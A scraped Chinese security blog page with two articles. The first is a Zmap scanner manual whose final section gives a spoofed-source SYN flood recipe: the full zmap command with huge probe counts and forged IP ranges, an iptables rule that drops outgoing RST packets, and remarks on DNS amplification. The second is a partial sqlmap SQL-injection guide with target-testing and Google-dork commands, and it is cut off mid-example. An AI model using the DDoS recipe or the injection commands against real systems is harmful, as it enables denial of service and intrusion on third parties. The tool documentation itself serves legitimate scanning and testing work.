<p><a href="http://drops.wooyun.org/login" title="登录" target="_blank">登录</a></p>
<p>像一朵乌云一样成长</p>
<ul>
<li><a href="http://drops.wooyun.org/" title="WooYun知识库" target="_blank">首页</a></li>
<li><a href="http://www.wooyun.org/" target="_blank">WooYun</a></li>
<li><a href="http://zone.wooyun.org/" target="_blank">Zone</a></li>
<li><a href="http://drops.wooyun.org/newsend" target="_blank">投稿</a>
<a href="http://drops.wooyun.org/" title="首页" target="_blank">首页</a> » <a href="http://drops.wooyun.org/category/tools" title="查看 工具收集 中的全部文章" target="_blank">工具收集</a> » Zmap详细用户手册和DDOS的可行性</li>
</ul>
<h2 id="-zmap-ddos-http-drops-wooyun-org-tools-515-permanent-link-to-zmap-ddos-"><a href="http://drops.wooyun.org/tools/515" title="Permanent Link to Zmap详细用户手册和DDOS的可行性" target="_blank">Zmap详细用户手册和DDOS的可行性 <img src="" alt=""></a></h2>
<p>6人收藏 <a href="">收藏</a></p>
<p>2013/08/23 11:52  | <a href="http://drops.wooyun.org/author/livers" title="由 livers 发布" target="_blank">livers</a>  | <a href="http://drops.wooyun.org/category/tools" title="查看 工具收集 中的全部文章" target="_blank">工具收集</a>  | <a href="">占个座先</a></p>
<h2 id="0x00-">0x00 背景</h2>
<p>Zmap是美国密歇根大学研究者开发出一款工具。在第22届USENIX安全研讨会，以超过nmap 1300倍的扫描速度声名鹊起。相比大名鼎鼎的nmap全网扫描速度是他最大的亮点。在千兆网卡状态下，45分钟内扫描全网络IPv4地址。</p>
<h3 id="-">安装：</h3>
<h3 id="64-">64位版本</h3>
<p>Debian/Ubuntu 系列
Step1: sudo apt-get install libgmp3-dev libpcap-dev gengetopt Step2: wget <a href="https://github.com/zmap/zmap/archive/v1.0.3.tar.gz" target="_blank">https://github.com/zmap/zmap/archive/v1.0.3.tar.gz</a> Step3: tar –zxvf v1.0.3.tar.gz Step4: cd zmap-1.0.3/src Step5: make &amp;&amp; make install</p>
<h3 id="32-zmap-64-linux-bt5r3-32-64-">32版本 （zmap 主页只说适用于64位linux,这里用BT5r3 32位同样安装成功,建议还是尽量选用64版本的）</h3>
<p>Debian/Ubuntu 系列
Step1: sudo apt-get install libgmp3-dev libpcap-dev gengetopt Step2: git clone git://github.com/zmap/zmap.git Step3: tar –zxvf v1.0.2.tar.gz Step4: cd zmap-1.0.2/src Step5: make &amp;&amp; make install</p>
<p>Fedora, Red Hat Enterprise Linux, or CentOS版本：</p>
<p>只把step2替换成
sudo yum install gmp gmp-devel libpcap-devel gengetopt</p>
<p>如果想使用 redis用来存储则需要首先安装 Hiredis，并在step5中</p>
<p>make REDIS=true   (加入此安装选项)</p>
<p>不是以root权限运行则需要配置：</p>
<p>setcap cap_net_raw=ep /usr/local/sbin/zmap</p>
<h2 id="0x01-">0x01 使用介绍：</h2>
<p>安装完后，可直接调用zmap</p>
<h3 id="1-">1.最简单的调用</h3>
<p>zmap -B 10M -p 80 -n 100000 -o results.txt</p>
<p>-B 是指的是带宽 -p 端口 -n 扫描多少个目标 -o 输出结果</p>
<p>整句表示利用10M带宽扫描100000IP地址的端口，并将结果输出到results.txt中。</p>
<p>我BT5 R3 测试时，必须加入-G 参数
zmap -B 10M -p 80 -n 100000 -G &quot;01:00:5e:00:00:02&quot; -o results.txt</p>
<p>-G 是指定出口的mac地址，必须为网关的实际mac地址，否则返回数据找不到信息。</p>
<p>如果扫到IP地址开了80端口，就会按照下列格式进行保存。
115.237.116.119 23.9.117.80 207.118.204.141 217.120.143.111</p>
<h3 id="2-">2.用的最多的指令</h3>
<p>zmap -p 443 -G &quot;00:00:00:00:00:00&quot;</p>
<p>检测全网络SSL/STL使用状况，ZMAP几个研究项目都与此有关。 ￼ <img src="" alt="enter image description here"></p>
<p>可见我使用的扫描全网的所得大约9小时16分钟，网络为10MADSL带宽，ADSL上行速度只有100k左右，导致时间加倍延迟。</p>
<h3 id="3-">3.常用参数</h3>
<p>-p, --target-port=port</p>
<p>指定扫描的目标端口</p>
<p>-o, --output-file=name  </p>
<p>把结果写入指定文件 -o result.txt</p>
<p>-b, --blacklist-file=path  </p>
<p>IP地址黑名单，例如192.168.0.0/16 表示 192.168.x.x将不被扫描，默认提供一份 RFC 1918保留和内网地址供参考，存放位置在</p>
<p>conf/blacklist.conf</p>
<p>zmap -p 443 -G &quot;00:00:00:00:00:00&quot; -b  conf/blacklist.conf -n, --max-targets=n</p>
<p>最大扫描IP地址数量，-n 100 表示总归扫描100个IP地址。也可指定 –n 0.1%形式，表示扫描除去黑名单列表里面全网段的0.1%数量的IP地址。</p>
<p>-N, --max-results=n</p>
<p>最大扫描到结果的IP数量，-N 100 表示扫描到100个存在的结果就停止。</p>
<p>-t, --max-runtime=secs</p>
<p>最大扫描时间，-t 10 表示程序运行10s结束。</p>
<p>-r, --rate=pps</p>
<p>设置每秒发送包的数量 –r 10000 表示每秒发送10k个包。</p>
<p>-B, --bandwidth=bps</p>
<p>设置每秒发送包的大小，-B 10M 表示每秒发送10Mbps 支持单位（GMK）。</p>
<p>-c, --cooldown-time=secs</p>
<p>设置数据包发送完之后多长时间开始接受数据（response）,默认8s，TCP连接异步接受。</p>
<p>-e, --seed=n</p>
<p>设置扫描随机地址的顺序，C语言中的伪随机种子，指定 定值每次随机扫描的IP地址顺序是一样。</p>
<p>-T, --sender-threads=n</p>
<p>设置扫描线程。默认是1，经测试单线程基本是把网络带宽充分利用。</p>
<p>-P, --probes=n</p>
<p>设置往每个IP发送包的数量，默认为1。（DDOS的参数之一）。</p>
<p>-d, --dryrun</p>
<p>打印出每个包的内容，非常实用的功能。</p>
<p>-s, --source-port=port|range</p>
<p>设置扫描的源端口，可指定范围 –s 30000-50000。（DDOS的参数之一）。</p>
<p>-S, --source-ip=ip|range</p>
<p>设置扫描的源IP地址，可指定范围-S 100.100.0.1-200.200.200.200（DDOS的参数之一）。</p>
<p>-G, --gateway-mac=addr</p>
<p>设置网关的mac地址，可伪造。（DDOS的参数之一）</p>
<p>-M, --probe-module=name</p>
<p>设置扫描模式，参数tcp_synscan（默认），icmp_echoscan（ping扫描），udp（测试速度要逊于前两个），这里可自定义自己的模块，ZMAP作者后续会增加例如自定义UDP payload 的选项。（`/*udp_send_msg = &quot;GET / HTTP/1.1</p>
<p>&quot;; // Must be null-terminated`）源码里不可直接更改 （1.0.3版本加入UDP Data Probes可进行自定义）
-O, --output-module=name</p>
<p>设置结果输出模块，参数simple_file（默认），extended_file。</p>
<p>Simple_file 模式如下
115.237.116.119 23.9.117.80 207.118.204.141 217.120.143.111</p>
<p>Extended File模式如下</p>
<p>response, saddr, daddr, sport, dport, seq, ack, in_cooldown, is_repeat, timestamp synack, 159.174.153.144, 10.0.0.9, 80, 40555, 3050964427, 3515084203, 0, 0,2013-08-15 18:55:47.681</p>
<p>扫描模块和输出模块都提供了API ，可自己根据需要添加功能。</p>
<p>--quiet</p>
<p>安静状态下运行，不把进度信息打印到屏幕上</p>
<p>--summary</p>
<p>输出结果汇总，对研究人员来说 非常有帮助。</p>
<h2 id="0x02-">0x02 三个额外的扩展应用</h2>
<h3 id="banner-grab">Banner Grab</h3>
<p>抓取指纹，简言之抓取response 为识别类似SSH，http 401之类的信息做准备。</p>
<p>这里 examples / banner-grab 目录下</p>
<p>首先 make 生成banner-grab-tcp</p>
<p>向http-req 文件写入要发送的数据 (也可以自定义SSH-req 之类)</p>
<p>如：
echo -e -n &quot;GET / HTTP/1.1 Host: %s &quot; &gt; http-req</p>
<p>（%s 保留，其他可任意构造HTTP请求，包括GET，POST）</p>
<p>这里扩展下 banner-grab-tcp下的参数
-c, --concurent   每次的连接数，最好低于1000，想要高于1000则必须设置ulimit -SSn 1000000<code>and</code>ulimit -SHn 1000000` 突破每个文件最大进程数1024 -p, --port      连接的端口 -t, --conn-timeout  连接超时时间 -r, --read-timeout  响应超时时间 -v, --verbosity     列取信息详细程度 ，与sqlmap 类似 -f, --format        输出文件格式hex，ascii，base64 -d, --data      发送的数据信息 就是前面设置http-req</p>
<p>源码里 /#define MAX_BANNER_LEN 1024 接收的每条返回数据，只接收1024字节，根据需要可自行更改。</p>
<h3 id="-zmap-">与zmap 联合使用</h3>
<p>例子
zmap -p 80 -N 1000 -o - | ./banner-grab-tcp -p 80 -c 100 -d http-req &gt; http-banners.out</p>
<p>zmap扫描1000个80端口开放的IP地址，banner-grab-tcp 来扫描这些IP地址，扫描请求内容通过http-req可自定义 .</p>
<h3 id="forge-socket">forge-socket</h3>
<p>与Banner Grab功能一样，参数也类似，不再重复。</p>
<p>主要是安装方式不同</p>
<p>要先安装下列驱动
git clone git@github.com:ewust/forge_socket.git cd forge_socket make sudo insmod forge_socket.ko（以底层驱动方式 比Banner Grab效率高一些）</p>
<p>并且用iptables阻止发rst包</p>
<p>iptables -A OUTPUT -p tcp -m tcp --tcp-flags RST,RST RST,RST -j DROP</p>
<h3 id="udp-data-probes">UDP Data Probes</h3>
<p>1.03版本加入</p>
<p>详细的测试payload见</p>
<p><a href="https://github.com/zmap/zmap/tree/master/examples/udp-probes" target="_blank"><a href="https://github.com/zmap/zmap/tree/master/examples/udp-probes">https://github.com/zmap/zmap/tree/master/examples/udp-probes</a></a></p>
<p>以探测mssql的1434端口为例：
zmap -M udp -p 1434 --probe-args=file:examples/udp-probes/mssql_1434.pkt</p>
<p>pkt也可自行构造。</p>
<p>格式化配置</p>
<p>利用配置文件 简化命令行输入
interface &quot;eth1&quot; source-ip 1.1.1.4-1.1.1.8 gateway-mac b4:23:f9:28:fa:2d /# upstream gateway cooldown-time 300 /# seconds blacklist-file /etc/zmap/blacklist.conf output-file ~/zmap-output quiet summary</p>
<p>上述指令上面全部有介绍。</p>
<p>很显然，可以通过配置文件更快速配置zmap.</p>
<p>使用方法：
zmap --config=~/.zmap.conf --target-port=443</p>
<h2 id="0x03-">0x03 原理分析</h2>
<p>Know it</p>
<p>首先讲下TCP三次握手。</p>
<p>在TCP/IP协议中，TCP协议提供可靠的连接服务，采用三次握手建立一个连接。</p>
<p><img src="" alt="enter image description here"></p>
<p>可见三次握手存在于发送-应答-发送机制，等待监听的时间势必导致发包速度很慢。</p>
<p>这里zmap是发送SYN，随后发送RST（重置连接），不存在监听同步操作，清空连接，再继续发下一个数据包。 而对于识别 zmap把 Ip地址和端口做了类似hash表一样的映射，当数据包返回时（可能是Syn+Ack，也可能RST），取出返回数据包里Ip和端口地址进行储存的hash表里查询，并对应处理记录。 同步变异步高效的基本原因。</p>
<h2 id="0x04-">0x04 发散扩展</h2>
<p>DDoS的可行性：</p>
<p>作者旨在关注全网的扫描，并未提及相关DDoS 的信息。</p>
<p>也并未特别提供指向型发包的指令。</p>
<p>下面讨论可能与作者想法相违，希望各位重在技术钻研，而非一些恶意破坏。</p>
<p>指定ip段 和ip地址
-w, --whitelist-file=path</p>
<p>限制只扫描文件中的下列地址或者地址段，例如：</p>
<p>222.222.221.82/24   （192.168.1.0-255 ）（可利用种子 –seed 调整从那个IP开始）</p>
<p>单个Ip地址</p>
<p>222.222.221.82/32  （随机找了一个，这里1.02版本测试不能直接，需要改 blacklist.c和constraint.c 中生成IP地址的二叉树的root节点一小部分代码）</p>
<p>然后利用</p>
<p>-P  10000000 （重复多次发包） -s  2000-60000 (设置一个大的端口段) -S  20.20.20.0-200.200.200.200（随机大量Ip地址，模拟分布式的D） -G  这个伪造mac （但是收不到数据包） Zmap –p 80 -P 10000000 -s 2000-60000 -S 20.20.20.0-200.200.200.200 -w attack_url.txt</p>
<p>见下列发送的数据效果，达到预期</p>
<p><img src="" alt="enter image description here"></p>
<p>可能造成什么样的危害?</p>
<p>可以配置IP Spoofing，syn flood,land attack, ICMP floods, Application floods 和其他UDP 全零等多种攻击。</p>
<p>Zmap 的发包速度甚至可以忽略一下 随后发的这个rst 包。</p>
<p>也可以做得完美一点就是利用iptables
iptables -A OUTPUT -p tcp -m tcp --tcp-flags RST,RST RST,RST -j DROP</p>
<p>把发出去的RST包给drop掉。</p>
<h3 id="-">可以再升一下？</h3>
<p>毕竟有部分扩展能控制到应用层也是可以进行慢攻击。</p>
<p>Get 类型
echo -e -n &quot;GET / HTTP/1.1 Host: %s &quot; &gt; http-req  替换成 echo -e -n &quot;GET / HTTP/1.1 Host: %s &quot; &gt; http-req</p>
<p>Post 类型</p>
<p>可以把源码sizeof(value) 的值设置一个大的动态数值。 Post数据设置很小。</p>
<h3 id="ddos-">DDoS 流量 +连接数 +畸形包</h3>
<h3 id="-">流量基本只能硬防，拼硬件。</h3>
<h3 id="zmap-10-g-dns-">zmap几乎是最大限度利用网络带宽，10台G口服务器不会损耗多少，如果再利用DNS放大流量之类，很恐怖的数字。</h3>
<p>Ps ：</p>
<p>Zmap 某些方面和python 的scapy很像。</p>
<p>但zmap 纯C实现，比scapy效率要高一些。</p>
<p>以前老是纠结scapy 随后发送RST 问题，这里利用iptables 方式确实是个好方法。</p>
<p>参考其中的源码和相对规范的API接口，编写一些模块可以玩出很多花样。</p>
<p>LINK:</p>
<p><a href="https://zmap.io/documentation.html" target="_blank"><a href="https://zmap.io/documentation.html">https://zmap.io/documentation.html</a></a></p>
<p><a href="https://github.com/zmap/" target="_blank"><a href="https://github.com/zmap/">https://github.com/zmap/</a></a>
<strong>Tags:</strong> <a href="http://drops.wooyun.org/tag/xss" target="_blank">xss</a>, <a href="http://drops.wooyun.org/tag/zmap" target="_blank">zmap</a></p>
<p>版权声明：未经授权禁止转载 <a href="http://drops.wooyun.org/author/livers" title="由 livers 发布" target="_blank">livers</a>@<a href="http://drops.wooyun.org/" target="_blank">乌云知识库</a>
分享到： <a href="&quot;分享到QQ空间&quot;"></a> <a href="&quot;分享到新浪微博&quot;"></a> <a href="&quot;分享到腾讯微博&quot;"></a> <a href="&quot;分享到人人网&quot;"></a> <a href="&quot;分享到网易微博&quot;"></a> <a href="&quot;累计分享1次&quot;">1</a></p>
<h3 id="-">相关日志</h3>
<ul>
<li><a href="http://drops.wooyun.org/papers/382" target="_blank">闲扯下午引爆乌云社区“盗窃”乌云币事件</a></li>
<li><a href="http://drops.wooyun.org/papers/653" target="_blank">搭建基于Suricata+Barnyard2+Base的IDS前端Snorby</a></li>
<li><a href="http://drops.wooyun.org/tips/159" target="_blank">Bypass IE XSS Filter</a></li>
<li><a href="http://drops.wooyun.org/papers/501" target="_blank">CVE-2012-0053详解</a></li>
<li><a href="http://drops.wooyun.org/papers/44" target="_blank">一次SWF XSS挖掘和利用</a></li>
<li><a href="http://drops.wooyun.org/papers/512" target="_blank">Short XSS</a>
上一篇:<a href="http://drops.wooyun.org/news/524" target="_blank">当下最流行的3大黑客seo优化手法大曝光</a></li>
</ul>
<p>下一篇:<a href="http://drops.wooyun.org/tips/516" target="_blank">利用Teensy进行EM410x卡模拟以及暴力破解EM410X类门禁系统可行性猜想</a></p>
<h3 id="-9-rss-2-0-http-drops-wooyun-org-tools-515-feed-trackback-http-drops-wooyun-org-tools-515-trackback-">楼被抢了 9 层了... <a href="">抢座</a>、<a href="http://drops.wooyun.org/tools/515/feed" target="_blank">Rss 2.0</a>或者 <a href="http://drops.wooyun.org/tools/515/trackback" target="_blank">Trackback</a></h3>
<ul>
<li><img src="" alt=""> 园长 | 2013/08/23 11:53 | <a href="">/#</a></li>
</ul>
<p>吃完饭再回来看。</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 国士无双 | 2013/08/23 11:54 | <a href="">/#</a></li>
</ul>
<p>先去吃饭...</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> erevus | 2013/08/23 12:11 | <a href="">/#</a></li>
</ul>
<p>在公司不敢测，怕被搞死...回家玩</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> <a href="http://www.80sec.com/" target="_blank">xsser</a> | 2013/08/23 12:16 | <a href="">/#</a></li>
</ul>
<p>ddos部分貌似还是比不上专业的ddos工具</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> livers | 2013/08/23 12:41 | <a href="">/#</a></li>
</ul>
<p>基本占满网速了，缺点是在于现成不太方便</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> liyang | 2013/08/23 12:37 | <a href="">/#</a></li>
</ul>
<p>今天安装的时候 最后make install要权限的</p>
<p>sudo make install
<a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> Jannock | 2013/08/23 12:39 | <a href="">/#</a></li>
</ul>
<p>zmap只管发包，所以目标越大回应的越多，他就越是快。</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> livers | 2013/08/23 12:43 | <a href="">/#</a></li>
</ul>
<p>对的，发包和收包异步进行 速度杠杠的</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> SunnyJay | 2013/08/23 18:31 | <a href="">/#</a></li>
</ul>
<p>看起来很火啊~</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<h3 id="-">发表评论</h3>
<p><a href="">点击这里取消回复。</a></p>
<p>您必须 <a href="http://drops.wooyun.org/login" target="_blank">登陆</a> 后才能发表评论。</p>
<h3 id="-">订阅更新</h3>
<ul>
<li><a href="http://drops.wooyun.org/feed" title="点击订阅" target="_blank"><img src="" alt=""></a></li>
</ul>
<h3 id="-">分类</h3>
<ul>
<li><a href="http://drops.wooyun.org/category/papers" title="漏洞分析" target="_blank">漏洞分析</a> (40)</li>
<li><a href="http://drops.wooyun.org/category/tips" title="技术分享" target="_blank">技术分享</a> (57)</li>
<li><a href="http://drops.wooyun.org/category/tools" title="工具收集" target="_blank">工具收集</a> (5)</li>
<li><p><a href="http://drops.wooyun.org/category/news" title="业界资讯" target="_blank">业界资讯</a> (3)</p>
<h3 id="-">最新日志</h3>
</li>
<li><p><a href="http://drops.wooyun.org/tips/688" title="Flash CSRF" target="_blank">Flash CSRF</a></p>
</li>
<li><a href="http://drops.wooyun.org/tips/689" title="XSS与字符编码的那些事儿 —科普文" target="_blank">XSS与字符编码的那些事儿 —科普文</a></li>
<li><a href="http://drops.wooyun.org/papers/680" title="Zabbix SQL Injection/RCE – CVE-2013-5743" target="_blank">Zabbix SQL Injection/RCE – CVE-2013-5743</a></li>
<li><a href="http://drops.wooyun.org/papers/679" title="CDN流量放大攻击思路" target="_blank">CDN流量放大攻击思路</a></li>
<li><a href="http://drops.wooyun.org/news/674" title="从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集" target="_blank">从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集</a></li>
<li><a href="http://drops.wooyun.org/tips/662" title="攻击JavaWeb应用[8]-后门篇" target="_blank">攻击JavaWeb应用[8]-后门篇</a></li>
<li><a href="http://drops.wooyun.org/papers/660" title="php4fun.sinaapp.com PHP挑战通关攻略" target="_blank">php4fun.sinaapp.com PHP挑战通关攻略</a></li>
<li><a href="http://drops.wooyun.org/papers/653" title="搭建基于Suricata+Barnyard2+Base的IDS前端Snorby" target="_blank">搭建基于Suricata+Barnyard2+Base的IDS前端Snorby</a></li>
<li><a href="http://drops.wooyun.org/tools/655" title="GPU破解神器Hashcat使用简介" target="_blank">GPU破解神器Hashcat使用简介</a></li>
<li><a href="http://drops.wooyun.org/tips/649" title="内网渗透应用 跨vlan渗透的一种思路" target="_blank">内网渗透应用 跨vlan渗透的一种思路</a></li>
</ul>
<h3 id="-">最新评论</h3>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>c2y2 在 <a href="http://drops.wooyun.org/tips/689#comment-1883" target="_blank">XSS与字符编码的那些事儿 ---科普文</a>
谢谢</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>Evi1c0de 在 <a href="http://drops.wooyun.org/tips/573#comment-1877" target="_blank">如何用意念获取附近美女的手机号码</a>
连接CMCC跳转到登陆页面 右键源码 修改即可</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>牛牛 在 <a href="http://drops.wooyun.org/tips/688#comment-1871" target="_blank">Flash CSRF</a>
支持一下呵呵</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>luwikes 在 <a href="http://drops.wooyun.org/papers/178#comment-1870" target="_blank">JBoss安全问题总结</a>
mark</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>NgInx 在 <a href="http://drops.wooyun.org/tips/688#comment-1869" target="_blank">Flash CSRF</a>
好吧，基佬，顶你一个，不错。</p>
<ul>
<li><a href="">下一页 »</a>
Powered by <a href="http://wordpress.org/" target="_blank">WordPress</a> | GZai Theme by <a href="http://huaidan.org/" title="GZai Theme produced by 鬼仔" target="_blank">鬼仔</a>
<a href="http://tongji.baidu.com/hm-web/welcome/ico?s=9fc41da6a2322bdd80563c9d5a4bdb1d" target="_blank"><img src="" alt=""></a></li>
</ul>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/学习手册类/">学习手册类</a></li></span></span> | <span class="tags">Tagged <a href="/tags/学习手册类/" class="label label-primary">学习手册类</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-学习手册类--Zmap详细用户手册和DDOS的可行性/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-学习手册类--Zmap详细用户手册和DDOS的可行性" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-学习手册类--sqlmap用户手册/">sqlmap用户手册</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-学习手册类--sqlmap用户手册/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="sqlmap-">sqlmap用户手册</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度云收藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<h1 id="-wooyun-http-drops-wooyun-org-wooyun-"><a href="http://drops.wooyun.org/" title="WooYun知识库" target="_blank">WooYun知识库</a></h1>
<p><a href="http://drops.wooyun.org/login" title="登录" target="_blank">登录</a></p>
<p>像一朵乌云一样成长</p>
<ul>
<li><a href="http://drops.wooyun.org/" title="WooYun知识库" target="_blank">首页</a></li>
<li><a href="http://www.wooyun.org/" target="_blank">WooYun</a></li>
<li><a href="http://zone.wooyun.org/" target="_blank">Zone</a></li>
<li><a href="http://drops.wooyun.org/newsend" target="_blank">投稿</a>
<a href="http://drops.wooyun.org/" title="首页" target="_blank">首页</a> » <a href="http://drops.wooyun.org/category/tips" title="查看 技术分享 中的全部文章" target="_blank">技术分享</a> » sqlmap用户手册</li>
</ul>
<h2 id="-sqlmap-http-drops-wooyun-org-tips-143-permanent-link-to-sqlmap-"><a href="http://drops.wooyun.org/tips/143" title="Permanent Link to sqlmap用户手册" target="_blank">sqlmap用户手册 <img src="" alt=""></a></h2>
<p>22人收藏 <a href="">收藏</a></p>
<p>2013/06/13 18:45  | <a href="http://drops.wooyun.org/author/瞌睡龙" title="由 瞌睡龙 发布" target="_blank">瞌睡龙</a>  | <a href="http://drops.wooyun.org/category/tips" title="查看 技术分享 中的全部文章" target="_blank">技术分享</a>  | <a href="">占个座先</a></p>
<p><a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" target="_blank"><a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1</a></a></p>
<p>当给sqlmap这么一个url的时候，它会：
1、判断可注入的参数 2、判断可以用那种SQL注入技术来注入 3、识别出哪种数据库 4、根据用户选择，读取哪些数据</p>
<p>sqlmap支持五种不同的注入模式：
1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 4、联合查询注入，可以使用union的情况下的注入。 5、堆查询注入，可以同时执行多条语句的执行时的注入。</p>
<p>sqlmap支持的数据库有：</p>
<p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p>
<p>可以提供一个简单的URL，Burp或WebScarab请求日志文件，文本文档中的完整http请求或者Google的搜索，匹配出结果页面，也可以自己定义一个正则来判断那个地址去测试。</p>
<p>测试GET参数，POST参数，HTTP Cookie参数，HTTP User-Agent头和HTTP Referer头来确认是否有SQL注入，它也可以指定用逗号分隔的列表的具体参数来测试。</p>
<p>可以设定HTTP(S)请求的并发数，来提高盲注时的效率。</p>
<p>Youtube上有人做的使用sqlmap的视频：</p>
<p><a href="http://www.youtube.com/user/inquisb/videos" target="_blank"><a href="http://www.youtube.com/user/inquisb/videos">http://www.youtube.com/user/inquisb/videos</a></a></p>
<p><a href="http://www.youtube.com/user/stamparm/videos" target="_blank"><a href="http://www.youtube.com/user/stamparm/videos">http://www.youtube.com/user/stamparm/videos</a></a></p>
<p>使用sqlmap的实例文章：</p>
<p><a href="http://unconciousmind.blogspot.com/search/label/sqlmap" target="_blank"><a href="http://unconciousmind.blogspot.com/search/label/sqlmap">http://unconciousmind.blogspot.com/search/label/sqlmap</a></a></p>
<p>可以点击<a href="https://github.com/sqlmapproject/sqlmap/tarball/master" target="_blank"><a href="https://github.com/sqlmapproject/sqlmap/tarball/master">https://github.com/sqlmapproject/sqlmap/tarball/master</a></a>下载最新版本sqlmap。</p>
<p>也可以使用git来获取sqlmap
git clone <a href="https://github.com/sqlmapproject/sqlmap.git" target="_blank">https://github.com/sqlmapproject/sqlmap.git</a> sqlmap-dev</p>
<p>之后可以直接使用命令来更新</p>
<p>python sqlmap.py --update</p>
<p>或者</p>
<p>git pull</p>
<p>更新sqlmap</p>
<p>如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。</p>
<p>共有七个等级，默认为1：
0、只显示python错误以及严重的信息。 1、同时显示基本信息和警告信息。（默认） 2、同时显示debug信息。 3、同时显示注入的payload。 4、同时显示HTTP请求。 5、同时显示HTTP响应头。 6、同时显示HTTP响应页面。</p>
<p>如果你想看到sqlmap发送的测试payload最好的等级就是3。</p>
<h2 id="-">获取目标方式</h2>
<h3 id="-url">目标URL</h3>
<p>参数：-u或者--url</p>
<p>格式：</p>
<p>http(s)://targeturl[:port]/[…]</p>
<p>例如：</p>
<p>python sqlmap.py -u &quot;<a href="http://www.target.com/vuln.php?id=1" target="_blank">http://www.target.com/vuln.php?id=1</a>&quot; -f --banner --dbs --users</p>
<p>从Burp或者WebScarab代理中获取日志</p>
<p>参数：-l</p>
<p>可以直接吧Burp proxy或者WebScarab proxy中的日志直接倒出来交给sqlmap来一个一个检测是否有注入。</p>
<h3 id="-">从文本中获取多个目标扫描</h3>
<p>参数：-m</p>
<p>文件中保存url格式如下，sqlmap会一个一个检测
www.target1.com/vuln1.php?q=foobar www.target2.com/vuln2.asp?id=1 www.target3.com/vuln3/id/1/*</p>
<h3 id="-http-">从文件中加载HTTP请求</h3>
<p>参数：-r</p>
<p>sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。</p>
<p>比如文本文件内如下：
POST /vuln.php HTTP/1.1 Host: www.target.com User-Agent: Mozilla/4.0 id=1</p>
<p>当请求是HTTPS的时候你需要配合这个--force-ssl参数来使用，或者你可以在Host头后门加上:443</p>
<h3 id="-google-">处理Google的搜索结果</h3>
<p>参数：-g</p>
<p>sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。</p>
<p>例子：
python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</p>
<p>（很牛B的功能，测试了一下，第十几个就找到新浪的一个注入点）</p>
<p>此外可以使用-c参数加载sqlmap.conf文件里面的相关配置。</p>
<h2 id="-">请求</h2>
<h3 id="http-">http数据</h3>
<p>参数：--data</p>
<p>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</p>
<p>例子：
python sqlmap.py -u &quot;<a href="http://www.target.com/vuln.php" target="_blank">http://www.target.com/vuln.php</a>&quot; --data=&quot;id=1&quot; -f --banner --dbs --users</p>
<h3 id="-">参数拆分字符</h3>
<p>参数：--param-del</p>
<p>当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p>
<p>例子：
